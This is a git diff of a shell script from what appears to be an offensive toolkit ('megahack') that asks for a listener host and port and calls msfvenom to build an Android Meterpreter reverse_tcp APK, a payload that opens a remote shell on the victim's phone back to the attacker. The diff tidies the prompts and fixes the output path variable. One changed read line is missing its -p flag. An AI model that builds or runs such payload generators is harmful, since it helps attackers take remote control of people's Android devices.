@@ -5,14 +5,16 @@ figlet PAYLOAD | lolcat -t
 tput setaf 6; echo "    "
 echo " "
 tput setaf 1; echo "SET LHOST "
-read lhost
+echo " "
+read -p 'lhost= ' lhost
 echo " " 
 tput setaf 2; echo "SET LPORT"
-read lport 
+echo " "
+read 'lport= ' lport 
 echo " "
 tput setaf 3; echo " OUTPUT NAME"
 read path
-msfvenom -p android/meterpreter/reverse_tcp LHOST="$lhost" LPORT="$lport" -o $HOME/megahack/output/android/"path".apk
+msfvenom -p android/meterpreter/reverse_tcp LHOST="$lhost" LPORT="$lport" -o $HOME/megahack/output/android/"$path".apk
 tput setaf 4; echo "PAYLOAD GENERATED SUCCESSFULLY"
 echo " "
 tput setaf 2; echo "PRESS INTER TO CONTINUE"
